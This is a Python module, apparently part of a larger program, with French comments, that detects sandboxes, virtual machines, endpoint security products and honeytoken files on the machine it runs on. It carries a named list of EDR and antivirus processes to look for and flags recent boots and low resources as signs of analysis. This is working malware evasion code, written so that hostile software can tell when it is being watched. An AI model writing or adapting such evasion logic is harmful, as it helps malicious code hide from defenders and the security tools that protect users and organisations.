# services/environment_detector.py
import os
from pathlib import Path
import sys
import platform
import psutil
import subprocess
import time


class EnvironmentDetector:
    """Détection avancée d'environnements hostiles."""
    def analyze(self):
        report = {
            "is_sandbox": False,
            "has_edr": False,
            "is_vm": False,
            "indicators": []
        }

        # 1. Vérification des ressources (sandbox)
        cpu_count = psutil.cpu_count()
        if cpu_count and cpu_count <= 2:
            report["is_sandbox"] = True
            report["indicators"].append("cpu_count_low")
        mem_gb = psutil.virtual_memory().total / (1024**3)
        if mem_gb < 4:
            report["is_sandbox"] = True
            report["indicators"].append("ram_low")

        # 2. Détection de virtualisation (Windows)
        if platform.system() == "Windows":
            try:
                result = subprocess.run(
                    ["wmic", "computersystem", "get", "model"],
                    capture_output=True, text=True, timeout=5
                )
                if "virtual" in result.stdout.lower() or "vmware" in result.stdout.lower():
                    report["is_sandbox"] = True
                    report["is_vm"] = True
                    report["indicators"].append("vm_detected")
            except:
                pass
            # Vérifier la présence de VirtualBox / VMWare dans les services
            try:
                result = subprocess.run(
                    ["tasklist", "/FI", "IMAGENAME eq VBoxService.exe"],
                    capture_output=True, text=True, timeout=5
                )
                if "VBoxService.exe" in result.stdout:
                    report["is_vm"] = True
                    report["indicators"].append("vbox")
            except:
                pass

        # 3. Détection d'EDR (processus connus)
        edr_list = [
            "csfalcon", "crowdstrike", "splunk", "elastic",
            "sentinel", "carbon", "cylance", "symantec",
            "sysmon", "defender", "msmpeng", "kaspersky",
            "mcafee", "trend", "fireeye", "carbonblack"
        ]
        for proc in psutil.process_iter(['name']):
            try:
                name = proc.info['name'].lower() if proc.info['name'] else ""
                if any(edr in name for edr in edr_list):
                    report["has_edr"] = True
                    report["indicators"].append(f"edr_{name.split()[0]}")
                    break
            except:
                pass

        # 4. Vérification du temps de boot (sandboxes récentes)
        uptime = time.time() - psutil.boot_time()
        if uptime < 3600:  # < 1 heure
            report["is_sandbox"] = True
            report["indicators"].append("recent_boot")

        # 5. Détection de fichiers honeytoken (ex: dans Documents)
        honey_paths = [
            str(Path.home() / "Documents" / "honeypot.txt"),
            str(Path.home() / "Desktop" / "secret.txt"),
            "/tmp/honeytoken"
        ]
        for hp in honey_paths:
            if os.path.exists(hp):
                report["indicators"].append("honeytoken_file")
                report["is_sandbox"] = True
                break

        return report